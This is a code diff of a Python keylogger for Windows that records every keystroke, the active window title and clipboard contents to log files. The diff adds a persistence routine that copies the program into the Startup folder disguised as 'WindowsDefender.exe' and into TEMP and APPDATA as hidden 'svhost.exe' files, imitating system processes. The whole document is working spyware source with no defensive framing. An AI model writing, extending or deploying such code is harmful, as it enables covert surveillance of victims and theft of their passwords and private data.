@@ -1,15 +1,17 @@
-import ctypes
-import logging
-import threading
-import os
-import win32gui
-import win32clipboard
+from logging import getLogger, Formatter, FileHandler, INFO
+from threading import Thread
+from win32gui import GetWindowText, GetForegroundWindow
+from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
+from win32api import SetFileAttributes
 from pynput.keyboard import Key, Listener
-from time import sleep, localtime, strftime, time
+from time import sleep, time
+from sys import argv
+from os import getlogin, getenv, path
+
 
 
 def win_main():
-    clipboard_thread = threading.Thread(target=monitor_clipboard)
+    clipboard_thread = Thread(target=monitor_clipboard)
     clipboard_thread.daemon = True
     clipboard_thread.start()
 
@@ -20,48 +22,42 @@ def press(key):
     start = time()
     global last_keys
     if key == Key.enter:
-        #with open("enter.txt", "a")as file:
-            #file.write(strftime("%Y:%m:%d %H:%M:%S", localtime()) + "\t" + get_current_windows() + "\t" + "".join(str(last_keys)) + "\n")
-        enter_logger.info(get_current_windows() + "\t\t" + get_clipboard_data())
+        logger.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
     else:
         try:
             if last_keys[-1] == Key.ctrl_l and key.char == 'v':
-                with open("paste.txt", "a")as file:
-                    file.write(strftime("%Y:%m:%d %H:%M:%S", localtime()) + "\t\t" + get_current_windows() + "\t\t" + get_clipboard_data() + "\n")
+                logger.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
         except (AttributeError, IndexError):
             pass
-    all_logger.info(key)
+    logger.info(key)
     if  len(last_keys) > 50:
         last_keys.clear()
     last_keys.append(key)
-    #print(last_key)
     end = time()
     print(end - start)
 
-def setup_logger(title, path, formatter="%(name)s:%(asctime)s:%(message)s", level=logging.INFO):
-    formatter = logging.Formatter(formatter)
-
-    handler = logging.FileHandler(path)
+def setup_logger(title, path, formatter="%(name)s:%(asctime)s:\t\t%(message)s", level=INFO):
+    formatter = Formatter(formatter)
+    handler = FileHandler(path)
     handler.setFormatter(formatter)
-
-    logger = logging.getLogger(title)
+    logger = getLogger(title)
     logger.setLevel(level)
     logger.addHandler(handler)
     return logger
 
 def get_current_windows():
-    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    return GetWindowText(GetForegroundWindow())
 
 def get_clipboard_data():
     try:
-        win32clipboard.OpenClipboard()
+        OpenClipboard()
         data = None
         try:
-            data = win32clipboard.GetClipboardData()
+            data = GetClipboardData()
         except TypeError:
             pass
         finally:
-            win32clipboard.CloseClipboard()
+            CloseClipboard()
         return data
     except:
         pass
@@ -71,16 +67,29 @@ def monitor_clipboard():
     while True:
         if data != get_clipboard_data():
             data = get_clipboard_data()
-            clipboard_logger.info(data + "" + get_current_windows())
+            logger.info("CLIPBOARD EVENT\t\t" + get_current_windows() + "\t\t" + data)
         sleep(1)
 
+def ensure_startup():
+    paths = ["C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsDefender.exe",
+             getenv("TEMP") + "\\svhost.exe",
+             getenv("APPDATA") + "\\svhost.exe"]
+    with open(argv[0], "rb")as file:
+        byt = file.read()
 
-last_keys = []
-path = "test.txt"
-all_logger = setup_logger("all", path)
-clipboard_logger = setup_logger("clipboard", "copy.txt", formatter="%(asctime)s:\t" + "\t\t" + "Copy data: %(message)s")
+    for p in paths:
+        if not path.exists(p):
+            print(p)
+            with open(p, "wb")as file:
+                file.write(byt)
+            SetFileAttributes(p, 2)
 
-enter_logger = setup_logger("enter", "enter.txt", formatter=strftime("%Y:%m:%d %H:%M:%S", localtime()) + "\t\t" + "%(message)s" + "\n")
 
-win_main()
+
+
+
+ensure_startup()
+'''last_keys = []
+logger = setup_logger("main", "test3.txt")
+win_main()'''
 
